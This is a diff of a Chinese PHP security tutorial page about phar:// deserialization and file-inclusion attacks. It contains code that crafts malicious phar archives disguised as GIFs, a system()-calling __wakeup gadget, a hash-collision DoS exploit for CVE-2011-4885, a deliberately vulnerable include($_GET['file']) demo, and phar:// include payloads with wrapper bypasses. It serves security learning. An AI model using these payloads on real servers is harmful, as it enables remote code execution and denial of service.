@@ -2755,28 +2755,146 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h2 id="&#x6587;&#x4EF6;&#x5305;&#x542B;">&#x6587;&#x4EF6;&#x5305;&#x542B;</h2>
+                                <h2 id="&#x53CD;&#x5E8F;&#x5217;&#x5316;">&#x53CD;&#x5E8F;&#x5217;&#x5316;</h2>
+<p>&#x53C2;&#x8003;</p>
+<ul>
+<li><a href="https://blog.zsxsoft.com/post/38" target="_blank">https://blog.zsxsoft.com/post/38</a></li>
+<li><a href="https://paper.seebug.org/680/" target="_blank">https://paper.seebug.org/680/</a></li>
+</ul>
+<p>&#x5229;&#x7528;&#x6761;&#x4EF6;</p>
+<ul>
+<li>phar&#x6587;&#x4EF6;&#x8981;&#x80FD;&#x591F;&#x4E0A;&#x4F20;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x3002;</li>
+<li>&#x5B58;&#x5728;<code>__destruct</code>,<code>__wakeup</code>&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x4F5C;&#x4E3A;&#x8DF3;&#x677F;</li>
+<li>&#x5B58;&#x5728;&#x76F8;&#x5173;<a href="https://blog.zsxsoft.com/post/38" target="_blank">&#x51FD;&#x6570;</a>&#x51FD;&#x6570;,&#x5E76;&#x4E14;&#x53C2;&#x6570;&#x53EF;&#x63A7;&#xFF0C;<code>:</code>&#x3001;<code>/</code>&#x3001;<code>phar</code>&#x7B49;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x6CA1;&#x6709;&#x88AB;&#x8FC7;&#x6EE4;&#x3002;</li>
+</ul>
+<p>&#x53D7;&#x5F71;&#x54CD;&#x7684;&#x51FD;&#x6570;&#x5217;&#x8868;
+<img src="../images/19-1-19_2018&#x603B;&#x7ED3;-PHP&#x7BC7;_&#x5229;&#x7528;&#x7C7B;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;Phar1.png" alt="">
+&#x5BF9;&#x4E8E;&#x51FD;&#x6570;&#x5F71;&#x54CD;&#x8303;&#x56F4;&#x7684;&#x6DF1;&#x5165;&#x8FFD;&#x6C42;&#x53C2;&#x770B;<code>zsx</code>&#x5E08;&#x5085;&#x7684;&#x6587;&#x7AE0;&#xFF0C;&#x7B80;&#x5355;&#x5982;&#x4E0B;&#xFF1A;</p>
+<ul>
+<li>exif (exif_thumbnail&#x3001;exif_imagetype)</li>
+<li>gd (imageloadfont&#x3001;imagecreatefrom..)</li>
+<li>hash (hash_hmac_file&#x3001;hash_file&#x3001;hash_update_file&#x3001;md5_file&#x3001;sha1_file)</li>
+<li>file/url (get_meta_tags&#x3001;get_headers)</li>
+<li>standard (getimagesize&#x3001;getimagesizefromstring)</li>
+<li>zip<pre><code class="lang-php">$zip = <span class="hljs-keyword">new</span> ZipArchive();
+$res = $zip-&gt;open(<span class="hljs-string">&apos;c.zip&apos;</span>);
+$zip-&gt;extractTo(<span class="hljs-string">&apos;phar://test.phar/test&apos;</span>);
+</code></pre>
+</li>
+<li>Postgres<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+$pdo = <span class="hljs-keyword">new</span> PDO(sprintf(<span class="hljs-string">&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;</span>, <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;postgres&quot;</span>, <span class="hljs-string">&quot;sx&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>));
+@$pdo-&gt;pgsqlCopyFromFile(<span class="hljs-string">&apos;aa&apos;</span>, <span class="hljs-string">&apos;phar://test.phar/aa&apos;</span>);
+</code></pre>
+</li>
+<li>MySQL (&#x8981;&#x8BBE;&#x7F6E;local-infile=1&#x3001;secure_file_priv=&quot;&quot;&#xFF0C;&#x56E0;&#x4E3A;&#x662F;&#x975E;&#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E;)<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>{
+  <span class="hljs-keyword">public</span> $s = <span class="hljs-string">&apos;&apos;</span>;
+  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span> <span class="hljs-params">()</span> </span>{
+      system($this-&gt;s);
+  }
+}
+$m = mysqli_init();
+mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, <span class="hljs-keyword">true</span>);
+$s = mysqli_real_connect($m, <span class="hljs-string">&apos;localhost&apos;</span>, <span class="hljs-string">&apos;root&apos;</span>, <span class="hljs-string">&apos;123456&apos;</span>, <span class="hljs-string">&apos;easyweb&apos;</span>, <span class="hljs-number">3306</span>);
+$p = mysqli_query($m, <span class="hljs-string">&apos;LOAD DATA LOCAL INFILE \&apos;phar://test.phar/test\&apos; INTO TABLE a  LINES TERMINATED BY \&apos;\r\n\&apos;  IGNORE 1 LINES;&apos;</span>);
+</code></pre>
+</li>
+</ul>
+<p>&#x6784;&#x9020;&#x6076;&#x610F;phar&#x5305;&#x7684;php&#x6587;&#x4EF6;&#xFF1A;
+phar.php</p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>{
+    }
+
+    @unlink(<span class="hljs-string">&quot;phar.phar&quot;</span>);
+    $phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x4E3A;phar</span>
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(<span class="hljs-string">&quot;&lt;?php phpinfo();__HALT_COMPILER();?&gt;&quot;</span>); <span class="hljs-comment">//&#x8BBE;&#x7F6E;stub</span>
+    $o = <span class="hljs-keyword">new</span> TestObject();
+    $phar-&gt;setMetadata($o); <span class="hljs-comment">//&#x5C06;&#x81EA;&#x5B9A;&#x4E49;&#x7684;meta-data&#x5B58;&#x5165;manifest</span>
+    $phar-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//&#x6DFB;&#x52A0;&#x8981;&#x538B;&#x7F29;&#x7684;&#x6587;&#x4EF6;</span>
+    <span class="hljs-comment">//&#x7B7E;&#x540D;&#x81EA;&#x52A8;&#x8BA1;&#x7B97;</span>
+    $phar-&gt;stopBuffering();
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<p>&#x5176;&#x4E2D;<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>&#x65F6;phar&#x6587;&#x4EF6;&#x7684;stub&#xFF0C;&#x53EF;&#x7528;&#x7406;&#x89E3;&#x4E3A;&#x4E00;&#x4E2A;&#x8868;&#x793A;&#xFF0C;&#x5FC5;&#x987B;&#x4EE5;<code>__HALT_COMPILER();?&gt;</code>&#x7ED3;&#x5C3E;&#xFF0C;&#x5426;&#x5219;phar&#x6269;&#x5C55;&#x5C06;&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x4E3A;phar&#x6587;&#x4EF6;&#x3002;&#x5177;&#x4F53;&#x53C2;&#x8003;<code>seebug</code>&#x7684;&#x6587;&#x7AE0;&#x3002;</p>
+<p>&#x653B;&#x51FB;&#x6D4B;&#x8BD5;
+parh_test1.php</p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span> 
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>{
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;Destruct called&apos;</span>;
+        }
+    }
+
+    $filename = <span class="hljs-string">&apos;phar://phar.phar/test.txt&apos;</span>;
+    file_get_contents($filename); 
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<p>phar&#x6587;&#x4EF6;&#x53EF;&#x4F2A;&#x9020;&#x4E3A;&#x5176;&#x4ED6;&#x6587;&#x4EF6;
+phar_2.php</p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>{
+    }
+
+    @unlink(<span class="hljs-string">&quot;phar.phar&quot;</span>);
+    $phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>);
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//&#x8BBE;&#x7F6E;stub&#xFF0C;&#x589E;&#x52A0;gif&#x6587;&#x4EF6;&#x5934;</span>
+    $o = <span class="hljs-keyword">new</span> TestObject();
+    $phar-&gt;setMetadata($o); <span class="hljs-comment">//&#x5C06;&#x81EA;&#x5B9A;&#x4E49;meta-data&#x5B58;&#x5165;manifest</span>
+    $phar-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//&#x6DFB;&#x52A0;&#x8981;&#x538B;&#x7F29;&#x7684;&#x6587;&#x4EF6;</span>
+    <span class="hljs-comment">//&#x7B7E;&#x540D;&#x81EA;&#x52A8;&#x8BA1;&#x7B97;</span>
+    $phar-&gt;stopBuffering();
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<p><strong>&#x8FD8;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x6765;&#x8FDB;&#x884C;&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x653B;&#x51FB;(PHP&#x5185;&#x6838;&#x54C8;&#x5E0C;&#x8868;&#x78B0;&#x649E;&#x653B;&#x51FB;&#xFF08;CVE-2011-4885&#xFF09;)</strong>
+exp_phar.php</p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+set_time_limit(<span class="hljs-number">0</span>);
+$size= pow(<span class="hljs-number">2</span>, <span class="hljs-number">16</span>);
+$array = <span class="hljs-keyword">array</span>();
+<span class="hljs-keyword">for</span> ($key = <span class="hljs-number">0</span>, $maxKey = ($size - <span class="hljs-number">1</span>) * $size; $key &lt;= $maxKey; $key += $size) {
+    $array[$key] = <span class="hljs-number">0</span>;
+}
+$new_obj = <span class="hljs-keyword">new</span> stdClass;
+$new_obj-&gt;hacker = $array;
+$p = <span class="hljs-keyword">new</span> Phar(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&apos;/avatar.phar&apos;</span>, <span class="hljs-number">0</span>);
+$p[<span class="hljs-string">&apos;hacker.php&apos;</span>] = <span class="hljs-string">&apos;&lt;?php ?&gt;&apos;</span>;
+$p-&gt;setMetadata($new_obj);
+$p-&gt;setStub(<span class="hljs-string">&apos;GIF&lt;?php __HALT_COMPILER();?&gt;&apos;</span>);
+</code></pre>
+<p>test.php</p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+set_time_limit(<span class="hljs-number">0</span>);
+$startTime = microtime(<span class="hljs-keyword">true</span>);
+file_exists(<span class="hljs-string">&quot;phar://avatar.phar&quot;</span>);
+$endTime = microtime(<span class="hljs-keyword">true</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;&#x6267;&#x884C;&#x65F6;&#x95F4;&#xFF1A;  &apos;</span>.($endTime - $startTime). <span class="hljs-string">&apos; &#x79D2;&apos;</span>;
+</code></pre>
+<p><strong>phar://&#x7ED5;&#x8FC7;</strong>
+&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF1A;</p>
+<pre><code>compress.bzip2://phar://
+compress.zlib://
+</code></pre><h2 id="&#x6587;&#x4EF6;&#x5305;&#x542B;">&#x6587;&#x4EF6;&#x5305;&#x542B;</h2>
 <p>(PHP 5 &gt;= 5.3.0, PHP 7, PECL phar &gt;= 1.0.0)</p>
 <p>&#x53C2;&#x8003;&#xFF1A;</p>
-<pre><code>- https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/
-</code></pre><p>&#x5229;&#x7528;&#x6761;&#x4EF6;</p>
-<pre><code>- phar&#x6587;&#x4EF6;&#x8981;&#x80FD;&#x591F;&#x4E0A;&#x4F20;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x3002;
-- &#x5B58;&#x5728;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x4F5C;&#x4E3A;&#x8DF3;&#x677F;
-- &#x5B58;&#x5728;&#x76F8;&#x5173;[&#x51FD;&#x6570;](https://blog.zsxsoft.com/post/38)&#x51FD;&#x6570;,&#x5E76;&#x4E14;&#x53C2;&#x6570;&#x53EF;&#x63A7;&#xFF0C;:&#x3001;/&#x3001;phar&#x7B49;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x6CA1;&#x6709;&#x88AB;&#x8FC7;&#x6EE4;&#x3002;
-  ![](/images/19-1-19_2018&#x603B;&#x7ED3;-PHP&#x7BC7;_&#x5229;&#x7528;&#x7C7B;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;Phar1.png)
-</code></pre><p>index.php</p>
+<ul>
+<li><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" target="_blank">https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a></li>
+</ul>
+<p>demo.php
+index.php</p>
 <pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-keyword">include</span>($_GET[<span class="hljs-string">&apos;file&apos;</span>]);
 <span class="hljs-meta">?&gt;</span>
 </code></pre>
-<p>1.txt</p>
-<pre><code class="lang-txt">&lt;?php phpinfo() ?&gt;
+<p>shell.txt</p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span> phpinfo() <span class="hljs-meta">?&gt;</span>
 </code></pre>
-<p><code>http://127.0.0.1/exp.zip/1.txt</code></p>
-<h2 id="&#x53CD;&#x5E8F;&#x5217;&#x5316;">&#x53CD;&#x5E8F;&#x5217;&#x5316;</h2>
-<p>&#x53C2;&#x8003;</p>
-<pre><code>- https://blog.zsxsoft.com/post/38
-- https://paper.seebug.org/680/
+<p>&#x628A;sehll.txt&#x538B;&#x7F29;&#x6210;test.zip&#x6587;&#x4EF6;</p>
+<p>&#x53EF;&#x7528;&#x4EE5;&#x4E0B;&#x59FF;&#x52BF;&#x8FDB;&#x884C;&#x5305;&#x542B;</p>
+<pre><code>index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/shell.txt   //&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;
+index.php?file=phar://test.zip/shell.txt   //&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;
 </code></pre>
                                 
                                 </section>
@@ -2812,7 +2930,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Phar的文件包含与反序列化","level":"2.1.3.3.1","depth":4,"next":{"title":"利用类进行CRLF攻击","level":"2.1.3.4","depth":3,"ref":"","articles":[{"title":"Soap和CRLF攻击","level":"2.1.3.4.1","depth":4,"path":"PHP/Soap和CRLF攻击.md","ref":"./PHP/Soap和CRLF攻击.md","articles":[]}]},"previous":{"title":"利用类进行反序列化","level":"2.1.3.3","depth":3,"ref":"","articles":[{"title":"Phar的文件包含与反序列化","level":"2.1.3.3.1","depth":4,"path":"PHP/Phar的文件包含与反序列化.md","ref":"./PHP/Phar的文件包含与反序列化.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"PHP/Phar的文件包含与反序列化.md","mtime":"2019-05-15T02:20:35.931Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-05-24T12:14:34.867Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Phar的文件包含与反序列化","level":"2.1.3.3.1","depth":4,"next":{"title":"利用类进行CRLF攻击","level":"2.1.3.4","depth":3,"ref":"","articles":[{"title":"Soap和CRLF攻击","level":"2.1.3.4.1","depth":4,"path":"PHP/Soap和CRLF攻击.md","ref":"./PHP/Soap和CRLF攻击.md","articles":[]}]},"previous":{"title":"利用类进行反序列化","level":"2.1.3.3","depth":3,"ref":"","articles":[{"title":"Phar的文件包含与反序列化","level":"2.1.3.3.1","depth":4,"path":"PHP/Phar的文件包含与反序列化.md","ref":"./PHP/Phar的文件包含与反序列化.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"PHP/Phar的文件包含与反序列化.md","mtime":"2019-05-24T13:15:45.992Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-05-24T13:16:09.386Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
@@ -2820,6 +2938,10 @@
         
     <script src="../gitbook/gitbook.js"></script>
     <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
     
         
         <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
